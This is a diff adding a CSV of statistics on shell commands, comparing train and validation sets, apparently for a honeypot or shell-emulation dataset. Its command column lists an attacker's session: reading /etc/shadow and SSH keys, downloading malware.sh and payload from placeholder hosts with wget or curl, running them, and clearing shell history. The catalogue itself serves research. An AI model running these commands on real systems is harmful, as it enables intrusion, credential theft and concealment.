@@ -1,0 +1,147 @@
+command,n_train,n_validation,wait_median_train,wait_median_validation,output_chars_median_train,output_chars_median_validation,output_chars_identical_sets
+./b.sh,32,6,0.047,0.047,62,62.5,False
+./malware.sh,23,7,0.047,0.047,74,74,False
+./payload,23,13,0.047,0.047,67,67,False
+./update.sh,24,11,0.047,0.047,71.5,71,False
+arp -a,41,23,0.047,0.047,57,57,True
+cat /etc/apt/sources.list,89,35,0.047,0.047,42,42,True
+cat /etc/crontab,26,15,0.047,0.047,32,31,True
+cat /etc/group,46,19,0.047,0.047,567,567,True
+cat /etc/hosts,58,23,0.047,0.047,214,214,True
+cat /etc/hosts | grep -v '^#',48,16,0.047,0.047,104,109,True
+cat /etc/issue,35,15,0.047,0.047,55,55,True
+cat /etc/os-release,100,51,0.047,0.047,35,36,True
+cat /etc/passwd,50,19,0.047,0.047,898,898,True
+cat /etc/passwd | grep sh,44,20,0.047,0.0545,873,873,True
+cat /etc/resolv.conf,26,11,0.047,0.047,73,73,True
+cat /etc/shadow,51,20,0.047,0.047,781,781,True
+cat /etc/sudoers,80,28,0.047,0.047,77,77,True
+cat /proc/cpuinfo,72,21,0.047,0.047,1445,1445,True
+cat /proc/version,93,38,0.047,0.047,163,162,True
+cat ~/.bash_history,58,21,0.047,0.047,83,83,True
+cat ~/.bash_history | grep ssh,51,21,0.047,0.047,94,94,True
+cat ~/.ssh/config,56,28,0.047,0.047,79,79,True
+cat ~/.ssh/known_hosts,51,19,0.047,0.047,89,89,True
+cd /dev/shm,45,14,0.047,0.047,34,34,True
+cd /tmp,34,8,0.047,0.047,26,26,True
+cd /tmp || cd /var/tmp,91,31,0.047,0.047,45,45,True
+cd /var/tmp,25,18,0.047,0.047,34,34,True
+chmod +x b.sh,26,10,0.047,0.047,91,92,False
+chmod +x malware.sh,19,9,0.047,0.047,103,103,False
+chmod +x payload,26,8,0.047,0.047,97,96.5,False
+chmod +x update.sh,25,8,0.047,0.0545,101,100.5,False
+chmod 777 b.sh,26,6,0.047,0.0545,91.5,91,False
+chmod 777 malware.sh,28,6,0.047,0.047,104,103.5,False
+chmod 777 payload,22,15,0.047,0.047,97,97,False
+chmod 777 update.sh,23,9,0.047,0.047,102,101,False
+clear,99,37,0.047,0.047,24,24,True
+crontab -l,27,8,0.047,0.047,53,47,True
+curl -I http://files.example/,24,12,0.047,0.047,94,94,True
+curl -I http://mirror.example/,30,14,0.047,0.0545,96,96,True
+curl -I http://pkg-repo.example/,26,19,0.047,0.047,100,100,True
+curl -O http://files.example/b.sh,5,2,0.047,0.055,103,103.5,False
+curl -O http://files.example/malware.sh,7,1,0.047,0.047,110,112,False
+curl -O http://files.example/payload,3,3,0.047,0.047,106,106,False
+curl -O http://files.example/update.sh,4,2,0.055,0.0545,109.5,110,False
+curl -O http://mirror.example/b.sh,7,3,0.047,0.047,106,105,False
+curl -O http://mirror.example/payload,3,5,0.047,0.047,111,111,False
+curl -O http://mirror.example/update.sh,9,2,0.047,0.055,111,110,False
+curl -O http://pkg-repo.example/malware.sh,4,2,0.047,0.0545,113.5,115.5,False
+curl -O http://pkg-repo.example/payload,1,3,0.062,0.047,113,112,False
+curl -s http://files.example/ip,11,4,0.047,0.0545,94,94,False
+curl -s http://mirror.example/ip,13,5,0.047,0.047,96,96,True
+curl -s http://pkg-repo.example/ip,9,3,0.047,0.047,100,100,True
+date,124,39,0.047,0.047,50,49,True
+df -h,217,88,0.047,0.047,612,612,True
+du -sh /var/log,171,81,0.047,0.047,42,42,True
+echo ok,28,8,0.047,0.047,25,26,False
+enable,35,19,0.047,0.047,771,771,False
+find / -name id_rsa 2>/dev/null,30,9,11.665,11.578,47,47,True
+find / -perm -4000 -type f 2>/dev/null,36,23,0.047,0.047,54,54,True
+find / -perm -u=s -type f 2>/dev/null,53,13,0.047,0.047,53,53,True
+free -m,213,71,0.047,0.047,228,228,True
+groups,112,42,0.047,0.047,27,28,True
+history -c,30,13,0.047,0.047,33,32,True
+hostname,125,48,0.047,0.047,30,30,True
+id,273,133,0.047,0.047,69,69,False
+ifconfig,40,10,0.047,0.062,922,922,True
+ip a,29,12,0.047,0.0545,81,81.5,True
+ip route,80,32,0.047,0.047,86,86,True
+journalctl -n 20,98,42,0.047,0.047,70,70,True
+ls,156,72,0.047,0.047,18,19,True
+ls -la,113,53,0.047,0.047,117,117,True
+ls -la /etc/cron.d,32,13,0.047,0.047,187,187,True
+ls -la /etc/passwd,38,20,0.047,0.047,90,90,True
+ls -la /etc/shadow,32,16,0.047,0.047,92,92,True
+ls -la /root/.ssh,37,19,0.047,0.047,185,184,True
+ls -la /usr/bin | grep rws,57,20,0.156,0.1485,329,328.5,True
+ls -la /var/log | tail -n 5,95,43,0.047,0.047,314,314,True
+ls -la ~/.ssh,79,34,0.047,0.047,91,91,True
+lscpu,18,5,0.047,0.047,617,617,True
+nc -zv 192.0.2.12 22,18,5,0.047,0.047,102,103,True
+nc -zv 192.0.2.5 22,12,11,0.047,0.047,100,101,True
+nc -zv 198.51.100.10 22,17,5,0.047,0.047,109,109,True
+nc -zv 203.0.113.8 22,29,8,0.047,0.047,105,105,True
+netstat -antp,79,26,0.047,0.047,1904,1904,True
+nmap -sn 192.0.2.0/24,81,34,0.047,0.047,68,68,True
+nproc,17,11,0.047,0.047,22,22,True
+ping -c 2 192.0.2.12,12,7,0.047,0.047,77,77,True
+ping -c 2 192.0.2.5,14,8,0.0545,0.047,76,76,True
+ping -c 2 198.51.100.10,26,8,0.047,0.047,80,80,True
+ping -c 2 203.0.113.8,15,6,0.047,0.047,78,83,False
+ps aux,225,103,0.047,0.047,6260,6260,True
+ps aux | grep sshd,202,93,0.047,0.047,35,35,True
+pwd,230,79,0.047,0.047,31,31,True
+rm -rf b.sh,21,8,0.047,0.047,34,34,False
+rm -rf malware.sh,13,4,0.047,0.063,40,39,False
+rm -rf payload,23,7,0.047,0.047,36,39,False
+rm -rf update.sh,11,7,0.047,0.047,39,38,True
+rm b.sh,15,5,0.047,0.047,82,82,False
+rm malware.sh,14,8,0.0545,0.047,93,94,False
+rm payload,13,10,0.047,0.047,88,87,False
+rm update.sh,19,6,0.047,0.047,91,91.5,False
+service cron status,116,57,0.047,0.047,36,36,True
+service ssh status,111,46,0.047,0.047,35,35,True
+sh b.sh,20,10,0.047,0.047,67.5,68,False
+sh malware.sh,24,8,0.047,0.047,80,79.5,False
+sh payload,25,10,0.047,0.047,74,73,False
+sh update.sh,24,6,0.047,0.062,78,78.5,False
+shell,43,15,0.047,0.047,59,59,False
+ss -tan,31,13,0.047,0.047,85,85,True
+ss -tulpn,33,14,0.047,0.047,86,86.5,True
+sudo -l,95,41,0.047,0.047,680,680,True
+system,34,10,0.047,0.047,60,61,False
+systemctl status ssh,106,42,0.047,0.047,73,73,True
+tail -n 50 /var/log/syslog,88,35,0.047,0.047,43,43,True
+uname -a,151,58,0.047,0.047,97,97,True
+uname -m,66,27,0.047,0.047,31,31,True
+uname -r,157,68,0.047,0.047,38,38,True
+unset HISTFILE,21,8,0.047,0.062,37,36,False
+uptime,181,63,0.047,0.047,84,84,False
+w,351,157,0.047,0.047,215,215,False
+wget -q http://files.example/malware.sh -O malware.sh,9,1,0.047,0.047,131,129,False
+wget -q http://files.example/payload -O payload,8,1,0.047,0.062,123,121,False
+wget -q http://files.example/update.sh -O update.sh,1,5,0.047,0.047,129,126,False
+wget -q http://mirror.example/b.sh -O b.sh,3,5,0.047,0.047,119,121,False
+wget -q http://mirror.example/malware.sh -O malware.sh,4,2,0.047,0.0625,130,132,False
+wget -q http://mirror.example/payload -O payload,5,4,0.047,0.047,124,124.5,True
+wget -q http://mirror.example/update.sh -O update.sh,6,3,0.047,0.062,130,128,False
+wget -q http://pkg-repo.example/b.sh -O b.sh,5,3,0.047,0.047,125,122,False
+wget -q http://pkg-repo.example/malware.sh -O malware.sh,2,2,0.047,0.0465,134.5,134.5,True
+wget -q http://pkg-repo.example/payload -O payload,7,2,0.047,0.0545,128,126,False
+wget -q http://pkg-repo.example/update.sh -O update.sh,4,2,0.047,0.047,132.5,130.5,False
+wget -qO- http://files.example/ip,6,4,0.0625,0.047,101,101,False
+wget -qO- http://mirror.example/ip,11,2,0.047,0.0545,103,103,False
+wget -qO- http://pkg-repo.example/ip,10,3,0.047,0.047,107,107,False
+wget http://files.example/b.sh,8,2,0.047,0.047,245,247,False
+wget http://files.example/malware.sh,4,3,0.047,0.047,258,258,False
+wget http://files.example/payload,8,1,0.047,0.062,251,254,False
+wget http://files.example/update.sh,4,1,0.047,0.046,256.5,255,False
+wget http://mirror.example/malware.sh,7,1,0.047,0.046,262,263,False
+wget http://mirror.example/payload,7,3,0.047,0.047,257,257,False
+wget http://pkg-repo.example/b.sh,5,1,0.047,0.047,260,263,False
+wget http://pkg-repo.example/malware.sh,3,3,0.047,0.047,273,272,False
+wget http://pkg-repo.example/payload,6,1,0.047,0.062,266.5,269,False
+wget http://pkg-repo.example/update.sh,4,2,0.047,0.047,270,273,False
+who,198,78,0.047,0.047,72,72,True
+whoami,156,72,0.047,0.047,28,26,True
